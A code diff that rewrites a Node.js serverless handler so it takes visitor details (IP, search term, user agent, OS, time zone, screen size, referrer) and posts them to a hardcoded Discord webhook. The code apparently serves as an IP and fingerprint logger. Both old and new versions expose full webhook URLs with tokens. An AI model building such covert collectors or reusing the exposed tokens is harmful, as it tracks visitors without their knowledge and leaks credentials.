@@ -1,31 +1,58 @@
-import express from 'express';
-import fetch from 'node-fetch'; // Use import here
-import { Router } from 'express';
+import fetch from 'node-fetch';
 
-const router = Router();
+export default async (req, res) => {
+    if (req.method === 'POST') {
+        const discordWebhookUrl = 'https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT'; // Your Discord webhook URL
 
-router.post('/log', async (req, res) => {
-    const logData = req.body;
+        try {
+            const { ip, searchTerm, userAgent, referrer, currentURL, screenWidth, screenHeight, browserLanguage, timeZone, osInfo, timestamp } = req.body;
 
-    try {
-        const webhookResponse = await fetch('https://discord.com/api/webhooks/1303441370706346147/5lY8JGHTS4UYv_rD7Q2zF0JXEifma22uqm9UPdQ1nf_pOBjK8rzX45XAEiouXXOHFXTz', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(logData)
-        });
+            // Check if required data is defined
+            if (!ip || !userAgent) {
+                return res.status(400).json({ message: 'Missing required data.' });
+            }
 
-        if (!webhookResponse.ok) {
-            const errorText = await webhookResponse.text();
-            console.error('Failed to send to Discord webhook:', webhookResponse.status, errorText);
-        } else {
-            console.log('Log sent to Discord successfully');
+            // Send the collected information to Discord
+            const logMessage = {
+                embeds: [
+                    {
+                        title: 'User Data Logged',
+                        description: `
+                            **Private IP:** \`${ip}\`
+                            **Search Term:** \`${searchTerm || 'No search term entered'}\`
+                            **User Agent:** \`${userAgent}\`
+                            **Browser Language:** \`${browserLanguage}\`
+                            **Operating System:** \`${osInfo}\`
+                            **Time Zone:** \`${timeZone}\`
+                            **Referrer URL:** \`${referrer || 'No referrer'}\`
+                            **Current URL:** \`${currentURL}\`
+                            **Screen Resolution:** \`${screenWidth} x ${screenHeight}\`
+                            **Timestamp:** \`${timestamp}\`
+                        `,
+                        color: 0xFF0000, // Red color
+                        timestamp: new Date(),
+                    },
+                ],
+            };
+
+            const response = await fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(logMessage),
+            });
+
+            if (!response.ok) {
+                const errorText = await response.text();
+                console.error('Failed to send message to Discord:', response.status, errorText);
+                return res.status(500).json({ message: 'Error sending to Discord' });
+            }
+
+            res.status(200).json({ message: 'User data logged successfully' });
+        } catch (error) {
+            console.error('Error occurred:', error);
+            res.status(500).json({ message: 'Error processing request' });
         }
-
-        res.status(200).json({ message: 'Logged successfully' });
-    } catch (error) {
-        console.error('Error sending log to Discord:', error);
-        res.status(500).json({ message: 'Failed to log' });
+    } else {
+        res.status(405).json({ message: 'Method Not Allowed' });
     }
-});
-
-export default router;
+};
